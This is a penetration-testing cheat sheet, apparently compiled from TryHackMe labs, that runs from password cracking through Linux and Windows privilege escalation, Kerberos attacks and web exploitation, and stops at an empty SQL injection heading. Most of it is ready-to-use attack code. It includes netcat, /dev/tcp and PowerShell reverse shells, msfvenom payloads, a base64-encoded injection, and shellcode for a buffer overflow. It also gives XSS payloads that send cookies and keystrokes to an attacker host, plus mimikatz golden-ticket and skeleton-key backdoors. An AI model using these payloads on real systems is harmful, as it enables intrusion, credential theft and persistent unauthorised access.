# Tools

### John

#### salted hash(Ex. sha512)

first, password file should be <pass>$<salt>

```bash
john --wordlist=<dict file> --format='dynamic=sha512($p.$s)' <pass file>
```



#### SSH Keys(id_rsa)

```bash
ssh2john <id_rsa> > <outputfile>
```

OR

```bash 
python3 /opt/ssh2john.py
```

OR

```bash
python /usr/share/john/ssh2john.py
```

### hashcat

```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```



### GPG, PGP

```bash
gpg --import priv.key(or .asc)
gpg <filename>.gpg(or <filename>.pgp)
```

To crack passphrase, 

```bash
pgp2john <file>.asc > hash.txt
john -w <wordlist_path>.txt hash.txt
```



# Linux

### nmap

- samba script on nmap

  ```bash
  nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>

- rpcbind

  when port 111 access to network file system

  ```bash
  nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
  ```

### samba, SMB

- ```bash
  smbmap -H <IP>
  ```

- ```bash
  smbclient //<ip>/anonymous
  ```

- ```bash
  smbclient //<ip>/<user> --user=<user>
  ```

- recursively download the SMB share

  ```bash
  smbget -R smb://<ip>/anonymous
  ```
  
  or Login via smbclient and then
  
  ```bash
  smb: \>mget *
  ```
  
  
  
- If it doesn't return ping, and want to enumerate SMB

  ```bash
  smbclient -L \\\\<ip>\\ -N
  ```

  

### FTP

```bash
ftp <IP>
username : anonymous
```

If error code 229, `ftp> passive`

If cannot download completely, try `ftp> binary`

### FTP ProFtpd

- copy files/directories from one place to another on the server 

  ```bash
  SITE CPFR
  SITE CPTO
  ```

  ```bash
  nc 10.10.41.232 21                                               
  220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.41.232]
  SITE CPFR /home/kenobi/.ssh/id_rsa 
  350 File or directory exists, ready for destination name
  SITE CPTO /var/tmp/id_rsa
  250 Copy successful
  ```

  mount the /var/tmp directory to our machine

  ```bash
  mkdir /mnt/kenobiNFS
  mount machine_ip:/var /mnt/kenobiNFS
  ls -la /mnt/kenobiNFS
  ```

  unmount

  ```bash
  umount /mnt/kenobi
  rm -r /mnt/kenobi
  ```

### Reverse SSH (SSH Port Forwarding)

Forward the traffic to a server I own and view blocked site by firewall, or if internal service is running.  Ex,

```bash
ssh -L 9000:imgur.com:80 user@example.com
```

Going to localhost:9000 on my machine, will load imgur traffic using my other server.

- practice

  ```bash
  <targetmachine>@<ssh> ~$ ss -tulpn
  <localmachine>@kali ~$ ssh -L <LPORT>:localhost:<RPORT> <username>@<ip>
  ```

  on browser, type "localhost:<LPORT>"



use socat instead;

```bash
/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
```



### Redis

[Hacktricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)

```bash
redis-cli -h <IP>
AUTH <password>
INFO
SELECT 0
KEYS *
GET <key>
```

### Rsync

```bash
nc <IP> 873
@RSYNCD: 31.0
#list
```

List files

```bash
rsync -av --list-only rsync://<IP>/<shared_name>
```

Copy/Upload files

```bash
rsync -av rsync://<IP>:873/<shared_name>/<file_path> .
rsync -av <file> rsync://<IP>:873/<shared_name>
```

Copy/Upload files if you have credential

```bash
rsync -av authorized_keys rsync://username@<IP>/home_user/.ssh
```



## Privilege Escalation

First, check /opt and /etc/<service> 

If you need to move other containers, you need to open new shell.

### SUID/GUID

- To search the a system for  files with SUID/GUID

  ```bash
  find / -perm -u=s -type f 2>/dev/null
  ```
  
- If bash script is owned by root but still id isn't change, try this;

  ```bash
  -rwsr-sr-x 1 root  root  1113504 Jul 22  2020  .suid_bash
  ./.suid_bash -p
  ```
  
- If a command contain suid bit,

  ```bash
  $ ltrace <command>
  ```

  and find `getenv("admin")`

  ```bash
  $ export admin=1
  ```

- If you are already root but not interactive shell;

  ```bash
  chmod +s /bin/bash
  ```

  then,

  ```bash
  /bin/bash -p
  ```


### Excutable files

```bash
$ groups
> users <username>
$ find / -group users -type f 2>/dev/null
```



### Capabilities

```bash
getcap -r / 2>/dev/null
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");
```



### Crontab

#### Wildcards*

Set if run * in home directory

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f" > shell.sh 
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh" 
touch "/var/www/html/--checkpoint=1"
```

don't forget to rm shell.sh, ""--check~.sh", and "--check~point=1"

#### Writable file

```bash
locate overwrite.sh
ls -l /usr/local/bin/overwrite.sh
```

replace the contents of overwrite.sh to below.

#!/bin/bash
bash -i >& /dev/tcp/10.13.35.230/4444 0>&1

#### PATH variable

- the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

  As this file runs as the root users privileges, we can manipulate our path gain a root shell.

  ```bash
  kenobi@kenobi:~$ strings /usr/bin/menu
  curl -I localhost
  uname -r
  ifconfig
  ```

  ```bash
  kenobi@kenobi:/tmp$ echo /bin/bash > curl
  kenobi@kenobi:/tmp$ chmod +x curl
  kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
  kenobi@kenobi:/tmp$ /usr/bin/menu
  ```

  or `chmod 4755 <script>`

- another way

  if `(root) NOPASSWD: /usr/sbin/shutdown` and `poweroff` is in `shutdown` (check with `strings`)

  ```bash
  fox@year-of-the-fox:/tmp$ cp /bin/bash ./poweroff
  fox@year-of-the-fox:/tmp$ sudo  "PATH=/tmp:$PATH" /usr/sbin/shutdown
  ```

  

### NFS

In /etc/exports, no_root_squash flag means all folders in NFS is owned by root and have root priviledge.

Need to be connected from inside, ex. reverse ssh! On victim machine,

```bash
rpcinfo -p
```

to check which port is open for nfs. Then, reverse ssh via that port.

```bash
<attacker> $ ssh -L 2049:localhost:2049 -i <id_rsa> <user>@<ip>
<victim> $ showmount -e localhost
<attacker> $ mkdir /tmp/nfs
<attacker> $ sudo mount -t nfs localhost:/ /tmp/nfs
```

#### Get root

- Put shell

  ```bash
  msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
  chmod +xs /tmp/nfs/shell.elf
  ```

  ```bash
  /tmp/shell.elf
  ```

- Copy bash

  On victim machine

  ```bash
  cp /bin/bash bash
  ```

  On attacker machine, in /tmp/nfs

  ```bash
  sudo chown root:root bash
  sudo chmod 4777 bash
  ```

  On victim machine

  ```bash
  ./bash -p
  ```

unmount

```bash
sudo umount /tmp/nfs
rm -r /tmp/nfs
```



### Sudo

execute command as  other user

```bash
sudo -u <user> <command>
```

### Sudoers

Ex. `/etc/sudoers.d/alice:alice ssalg-gnikool = (root) NOPASSWD: /bin/bash`

```bash
 sudo -l -h ssalg-gnikool
```

If you see `User alice may run the following commands on ssalg-gnikool:
    (root) NOPASSWD: /bin/bash`, then

```bash
sudo -h ssalg-gnikool /bin/bash
```

- if `env_keep+=LD_PRELOAD` is set, make shell.c as follows:

  ```c
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>void _init() {
   unsetenv("LD_PRELOAD");
   setgid(0);
   setuid(0);
   system("/bin/bash");
  }
  ```

  then,

  ```bash
  gcc -fPIC -shared -o shell.so shell.c -nostartfiles
  sudo LD_PRELOAD=/home/webdeveloper/shell.so <command>
  ```


### lxd

If uid lxd is enabled, read [this](https://www.hackingarticles.in/lxd-privilege-escalation/)

### SQL expose

on attacker machine,

```bash
mysql -u root -p
show databases;
use <database>;
show tables;
SELECT * FROM <table>;
```

### Enumerate services (Ex. TeamCity)

```bash
<target> $ ss -tulpn
```

If you find ports only for local, Ex. **[::ffff:127.0.0.1]:8111**

```bash
<target> $ wget http://127.0.0.1:8111
```

```bash
ssh -L 8111:127.0.0.1:8111 <user>@<IP> -i id_rsa
```

on Browser, search `http://localhost:8111`

```bash
<ssh> $ grep -iR "authentication token" 2>/dev/null
```



### Buffer Overflow

If argv[1] is used, use `./<script> $(python -c "<command>")`

Else if get() or getline() is used, use `./<script> < <(python -c "<command>")` or `./<script> < out.txt`

```bash
gdb -q <file_path>
(gdb) r $(python -c "print('A' * 155)")

Program received signal SIGSEGV, Segmentation fault.
0x0000000000414141 in ?? ()
```

You can assume offset is 152

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
```

```bash
(gdb) r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8A...'
(gdb) i r
...
rbp            0x6641396541386541	0x6641396541386541
...
```

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 6641396541386541
Exact match at offset 144
```

From above, you can see offset is 144, registry is 8, so you need 152 bytes to reach return address.

```bash
(gdb) r $(python -c "print('A' * 152 + 'BBBBBBBB')")
(gdb) x/xg $rsp
0x7fffffffe2c8: 0x4242424242424242
```

Successfully overwrote return address!

The script is owned by user with uid 1003, `pwn shellcraft -f d amd64.linux.setreuid 1003` and get shell `\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05`

Then, pick shell from [here](http://shell-storm.org/shellcode/)

```bash
(gdb) r $(python -c "print('\x90' * 86 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'A' * 36 + 'BBBBBBBB')")
(gdb) x/100x $rsp-160
0x7fffffffe228: 0x9090909090909090      0x9090909090909090
0x7fffffffe238: 0x9090909090909090      0x9090909090909090
0x7fffffffe248: 0x9090909090909090      0x9090909090909090
0x7fffffffe258: 0x9090909090909090      0x9090909090909090
0x7fffffffe268: 0x9090909090909090      0x9090909090909090
0x7fffffffe278: 0xebbf66ff31909090      0x0ffe894858716a03
0x7fffffffe288: 0x969dd1bb48c03105      0xdbf748ff978cd091
0x7fffffffe298: 0x5e545752995f5453      0x41414141050f3bb0
0x7fffffffe2a8: 0x4141414141414141      0x4141414141414141
0x7fffffffe2b8: 0x4141414141414141      0x4141414141414141
0x7fffffffe2c8: 0x4242424242424242      0x00007fffffffe300
0x7fffffffe2d8: 0x0000000200000000      0x00000000004005e0
```

As you see above, you can pick address such as 0x7fffffffe268

```bash
(gdb) r $(python -c "print('\x90' * 86 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'A' * 36 + '\x68\xe2\xff\xff\xff\x7f\x00\x00')")
process 5250 is executing new program: /usr/bin/bash
sh-4.2$
```

Successfully got shell!

```
./<service> $(python -c "print('\x90' * 86 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'A' * 36 + '\x68\xe2\xff\xff\xff\x7f\x00\x00')")
sh-4.2$
```



### Kernel(overlayfs)

37292.c

if gcc is not available on target but only cc,

```bash
sed -i "s/gcc/cc/g" 37292.c
cc ofs.c -o ofs
./ofs
```



## Persistence

### Adding SSH key

On attacker machine,

```bash
ssh-keygen -f <output id_rsa file name> -C ""
```

copy the output to /home/<victim>/.ssh/authorized_keys

```bash
echo "OUTPUT_OF_<victim>.PUB" >> /home/<victim>/.ssh/authorized_keys
```

#### Activate SSH root login

In /etc/ssh/sshd_config, set as "PermitRootLogin yes" or "PermitRootLogin prohibit-password"

## Others

- find particular file

  ```bash
  find / -type f -iname '*.flag' -exec echo {} \; -exec cat {} \;  2>/dev/null
  ```



# Windows

Windows privilege escalation - PowerUp.ps1

initial access - [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) ([Nishang](https://github.com/samratashok/nishang) is a useful set of scripts for initial access, enumeration and privilege escalation)

- reverse shell

  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=10.13.35.230 LPORT=12345 -e x86/shikata_ga_nai -f exe -o ASCService.exe
  ```

- switch to meterpreter shell

  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
  python3 -m http.server <port>
  ```

  then, on windows

  ```powershell
  powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
  ```

  on metasploit

  ```bash
  use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
  ```

  on windows

  ```powershell
  Start-Process "shell-name.exe"
  ```

- transfer files

  python http.server on kali, then on windows command line, 

  ```
  certutil -urlcache -f http://$your_ip/chatserver.exe chatserver.exe
  ```

  

### Information Gathering

- User

  Current user’s privileges: `whoami /priv`

  List users: `net users`

  List details of a user: `net user username` (e.g. `net user Administrator`)

  Other users logged in simultaneously: `qwinsta` (or `query session`)

  User groups defined on the system: `net localgroup`

  List members of a specific group: `net localgroup groupname` (e.g. `net localgroup Administrators`)

- System

  `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

  `hostname`

- Files

  `findstr /si password *.txt` (`.xml`, `.ini`, `.config`, `.xls` are also good choice)

  Directory: `dir /b /s "directoryname"`

  File: `where /r . *.pdf`

- Patch: `wmic qfe get Caption,Description,HotFixID,InstalledOn`

- Network: `netstat -ano`

- Scheduled tasks: `schtasks /query /fo LIST /v`

- Driver: `driverquery`

- Antivirus

  - Windows defender: `sc query windefend`
  - Antivirus software: `sc queryex type=service`

- Software Versions

  `wmic product get name,version,vendor`

  `wmic service list brief | findstr "Running"`

  `wmic service get name,displayname,pathname,startmode`

  `sc qc <service>`

- Unquoted Service Path

  `sc qc unquotedsvc`

  Check file permission: `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"`

  Then, `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f exe > executable_name.exe`

  After that, `sc start unquotedsvc`

### RDP

- XfreeRDP

  ```bash
  xfreerdp /u:admin /p:password /cert:ignore /v:10.10.227.138 /workarea
  ```

- Remmina

### Buffer Overflow

[Tutorial](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

fuzzer.py

```python
import socket, time, sys

ip = "<IP>"
port = <port>
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))

        print("Fuzzing with %s bytes" % len(string))
        s.send(bytes(string + "\r\n", "latin-1"))
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

exploit.py

```python
import socket

ip = "<IP>"
port = <port>

overflow = "A" * <offset> + "<address>" + <additional no-ops such as "\x90" * 32>
payload = ("<payload>")
message = overflow + payload


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(message + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
```

If you need to receive data, add s.recv(1024)



Setup Mona

```bash
!mona config -set workingfolder c:\mona\%p
```

Send patterned texts to buffer overflow

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <num>
```

Check offset with EIP

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP>
```

Send "A" * offset + "B" * 4 and make sure EIP is 42424242

Generate badarray with mona in Immunity debugger

```bash
!mona bytearray -b "\x00<and other bad char>"
```

Send all chars as payload and see which is bad char

```python
for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
```

```bash
!mona compare -f C:\mona\appname\bytearray.bin -a <ESP>
```

Find jmp esp

```bash
!mona jmp -r esp -cpb "\x00<and other bad chars>"
```

Make payload

```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> EXITFUNC=thread -b "\x00<and other bad chars>" -f c
```

Also you can use windows/meterpreter/reverse_tcp and get shell with multi/handler.(Don't forget to set payload!)



### meterpreter

- convert a shell to meterpreter shell

  ```bash
  post/multi/manage/shell_to_meterpreter
  ```

- migrate to other process

  ```bash
  meterpreter > getuid
  meterpreter > getsystem
  meterpreter > ps
  meterpreter > migrate <process ID>      
  ```

  spoolsv.exe is a good option

- dump hashes

  ```bash
  meterpreter > hashdump
  ```

  passwords are also often stored at C:\Windows\System32\config

- powershell

  ```bash
  meterpreter > load powershell
  meterpreter > powershell_shell
  ```

- shell

  ```bash
  meterpreter > shell
  ```

- upload files

  ```bash
  meterpreter > upload <file>
  ```

- Send shell

  use "exploit/multi/script/web_delivery" and payload "windows/meterpreter/reverse_http", set target as 2

  

### PowerShell

`Verb-Noun`, Ex. `Get-Help Command-Name -examples`, `Get-Command New-*`

View members for Get-Command: `Get-Command | Get-Member -MemberType Method`

Create objects: `Get-ChildItem | Select-Object -Property Mode, Name`

Filter object: `Get-Service | Where-Object -Property Status -operator Stopped`

Sort objects: `Get-ChildItem | Sort-Object`

Find file: `Get-ChildItem -Path C:\ -Include *interesting-file.txt* -File -Recurse -ErrorAction SilentlyContinue`

Show contents of file: `Get-Content *interesting-file.txt*`

Show Users: `Get-LocalUser`

Show Users witch doesn't require password: ` Get-LocalUser | Where-Object -Property PasswordRequired -Match False`

Show IP: `Get-NetIPAddress`

Show open ports: `GEt-NetTCPConnection | Where-Object -Property State -Match Listen | measure`

Show patches applied: `Get-HotFix` 

Search files which contain API_KEY: `Get-ChildItem C:\Users -Recurse | Select-String -pattern API_KEY` this also can be used to find password `-pattern password`

Show running process: `Get-Process`

Show specified scheduled task: `Get-ScheduledTask -TaskName <task name>`

Show owner of file: `Get-Acl C:/`





## Privilege Escalation

[Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Tools

- WinPEAS: `winpeas.exe > outputfile.txt` (WinPEAS will be blocked by Windows Defender)

- PowerUp.ps1

  ```powershell
  Shell> powershell.exe -nop -exec bypass
  PS> Import-Module .\PowerUp.ps1
  PS> Invoke-AllChecks
  ```

- Windows Exploit Suggester(More stealth than WinPEAS. Run on attacker machine)

  Beforehand run `systeminfo` on target, and save as `.txt` file

  ```bash
  windows-exploit-suggester.py –update
  windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo_out.txt
  ```

  Or WES-NG:

  ```bash
  pip install wesng
  wes.py --update
  wes.py systeminfo_out.txt
  ```

- Metasploit: `multi/recon/local_exploit_suggester`

### Windows Installer

If both of these are set, 

`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`

`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

Then, `msfvenom -p windows/x64/shell_reverse_tcp LHOST=A<IP> LPORT=<port> -f msi -o malicious.msi`

```shell
Shell> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```



### token impersonation

```powershell
PS C:\Users\bruce\Desktop> whoami /priv
```

check any of below tokens are enabled;

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

```bash
meterpreter > load incognito (or "use incognito")
meterpreter > list_tokens -g
meterpreter > impersonate_token "BUILTIN\Administrators"
```

Don't forget to migrate!



### Impacket

```bash
secretsdump.py <user>@<domain>
```

After obtain NT hashes, use **evil-winrm**



### Gather creds in firefox w/meterpreter

after get meterpreter shell, 

```bash
meterpreter> run post/multi/gather/firefox_creds
```

Change the file names to correct one... Ex. cert9.db, logins.json

Then, use [python script ](https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py) 

```bash
python3 firefox_decrypt.py <file path> 
```

use psexec in impacket, or rpc to login

### Passwords

- Gain Base64 encoded password

  hash is in C:\Windows\Panther\Unattend\Unattended.xml

- Saved credentials

  If `cmdkey /list` worked, try `runas /savecred /user:admin reverse_shell.exe`

- Registry keys containing passwords

  `reg query HKLM /f password /t REG_SZ /s`

  `reg query HKCU /f password /t REG_SZ /s`

- Unattend.xml sometimes worth reading

### DLL Hijacking

Vulnerability scanner: Process Monitor (ProcMon) (Need admin priv to run.)

If there are missing dll file, you can create

```c
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user jack Password11");
        ExitProcess(0);
    }
    return TRUE;
}
```

If don't have mingw, `apt install gcc-mingw-w64-x86-64`

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```

Then on target powershell, 

```powershell
wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll
sc stop <service> & sc start <service>
```



## Attack Kerberos

Attack Privilege Requrements-

- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required



### Enumeration

#### Kerbrute

Add victim IP to /etc/hosts as CONTROLLER.local (DNS_Domain_Name in nmap)

On attacker machine,

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local <User.txt>
```



#### BloodHound

GUI similar to PowerView

```bash
powershell -ep bypass
. .\Downloads\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

transfer zip to attacker machine

#### PowerView

- Server Manager

  Use windows built in Server Manager

  enumerate domain after gained shell

  ```shell
  powershell -ep bypass
  ```

  ```powershell
  . .\PowerView.ps1
  ```

  - Enumerate domain users

    ```powershell
    Get-NetUser | select cn
    ```

  - Enumerate domain groups

    ```powershell
    Get-NetGroup -GroupName *admin*
    ```

  - Shared folder

    ```powershell
    Invoke-ShareFinder
    ```

  - Operating system

    ```powershell
    Get-NetComputer -fulldata | select operatingsystem
    ```


### Harvesting & Brute-Forcing Tickets w/ Rubeus

Harvesting gathers tickets  that are being transferred to the KDC and saves them for use in other  attacks such as the pass the ticket attack.

On victim machine,

```
Rubeus.exe harvest /interval:30
```

add the IP and domain name to the hosts file from the machine by using the echo command:

```powershell
echo 10.10.122.227 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

take a given password and "spray" it against all found users then give the .kirbi TGT for that user 

```powershell
Rubeus.exe brute /password:Password1 /noticket
```



### Kerberoasting w/ Rubeus & Impacket

- method 1: Rubeus

  dump the Kerberos hash of any kerberoastable users

  ```powershell
  Rubeus.exe kerberoast
  ```

- method 2: Impacket

  dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like  Rubeus does; however, this does not have to be on the targets machine  and can be done remotely.

  ```bash
  cd /usr/share/doc/python3-impacket/examples/
  sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.122.227 -request
  hashcat -m 13100 -a 0 hash.txt rockyou.txt
  ```

- method 3: When you already in target machine; To gain Username,

  ```powershell
  PS> setspn -T medin -Q */*
  ```

  And then gain password hash

  ```powershell
  PS> iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 
  PS> Invoke-Kerberoast -OutputFormat hashcat |fl
  ```

  Then brute-force `hashcat -m 13100 -a 0 hash.txt <wordlist> --force`

- query ASReproastable accounts w/Impacket 

  ```bash
  GetNPUsers.py <domain>/<user>
  ```

  

### AS-REP Roasting w/ Rubeus

```powershell
Rubeus.exe asreproast
```

Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User...

hashcat mode 18200



### Pass the Ticket w/ mimikatz

minikatz is very good post-exploitation tool

#### Prepare Mimikatz & Dump Tickets

Ensure outputs [output '20' OK] if it does not that means you do not have the administrator  privileges to properly run mimikatz

```bash
> mimikatz.exe
privilege::debug
```

export all of the base64 encoded .kirbi tickets into the directory that you are currently in

```bash
sekurlsa::tickets /export
```

#### Pass the Ticket w/ Mimikatz

run this command inside of  mimikatz with the ticket that you harvested from earlier. It will cache  and impersonate the given ticket

```bash
kerberos::ptt <ticket>
```

exit minikaz.

verifying that we successfully impersonated the ticket by listing our cached tickets.

```bash
> klist
```



### Golden/Silver Ticket Attacks w/ mimikatz

A silver ticket can  sometimes be better used in engagements rather than a golden ticket  because it is a little more stealth. The approach to creating one is the exact same. A silver ticket is limited to the service that is targeted whereas a golden ticket has access to any  Kerberos service.

#### Dump the krbtgt hash

```bash
> mimikatz.exe
privilege::debug
```

dump the hash as well as  the security identifier needed to create a Golden Ticket. To create a  silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService  account.

```bash
lsadump::lsa /inject /name:krbtgt
```

or `lsadump::lsa /patch` to dump hashes for users

#### Create a Golden/Silver Ticket

Creating a golden ticket. To create a silver ticket simply put a service NTLM hash into the krbtgt  slot, the sid of the service account into sid, and change the id to  1103.

```bash
Kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /krbtgt:<ticket> /id:<id>
```

<sid>: after Domain part, ex. S-1-5-21-849420856-2351964222-986696166

<ticket>:  * Primary NTLM, ex. 5508500012cc005cf7082a9a89ebdfdf

<id>: Ex. 500

#### Use the Golden/Silver Ticket to access other machines

open a new elevated command prompt with the given ticket in mimikatz.

```bash
misc::cmd
```

### Kerberos Backdoors w/ mimikatz

#### Preparing Mimikatz

```bash
> mimikatz.exe
privilege::debug
```

#### Installing the Skeleton Key w/ mimikatz

```bash
misc::skeleton
```

#### Accessing the forest

- Ex1

  The share will now be accessible without the need for the Administrators password

  ```bash
  net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
  ```

- Ex2

  access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

  ```bash
  dir \\Desktop-1\c$ /user:Machine1 mimikatz
  ```

  

# Web

## Subdomain

`-site:www.tryhackme.com site:\*.tryhackme.com` in Google

### DNS Bruteforce

```bash
dnsrecon -t brt -d acmeitsupport.thm
```

### Sublist3r

```bash
./sublist3r.py -d acmeitsupport.thm
```



## Shells

### netcat 

- netcat stabilization

  - 1

    ```bash
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    <Ctrl + z>
    stty raw -echo; fg
    ```

  - 2 install rlwrap first

    ```bash
    rlwrap nc -lvnp <port>
    stty raw -echo; fg
    ```

- common shell payloads

  - linux bind shell

    ```bash
    mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
    ```

  - linux reverse shell

    ```bash
    mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
    ```

    ```bash
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
    ```
  
    

  - windows one-liner php reverse shell
  
    ```bash
    powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```
  
  for others, check [PayloadsAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)



- escape server-side filter

  ```bash
  \";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjYwLjIxMy8xMjM0NSAwPiYxCg== | base64 -d | bash\n\"
  ```

  

## XSS

xsshunter

`<script>alert('XSS');</script>`

If there's function like `user.changeEmail()` usen, 

try `<script>user.changeEmail('attacker@hacker.thm'); </script>`

`/images/cat.jpg" onload="alert('THM');`

### Polyglots

Payload which escape attributes, tags and bypass filters 

```bash
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```



### Session Stealing

`<script>fetch('https://hacker.thm/steal?cookie='+btoa(document.cookie));</script>`

### Key Logger

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

### Cookie

payload

```html
<script>document.location='http://<attacker_IP>:<port>/XSS/grabber.php?c='+document.cookie</script>
```

```bash
nc -lvnp <port>
```

on browser console,

```javascript
document.cookie = "token=<admin_cookie>"
```



## SQL Injection

### In-Band

```sql
1 UNION SELECT 1
1 UNION SELECT 1,2,3
0 UNION SELECT 1,2,3
0 UNION SELECT 1,2,database() //find database 'sqli_one'
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

### Blind

```sql
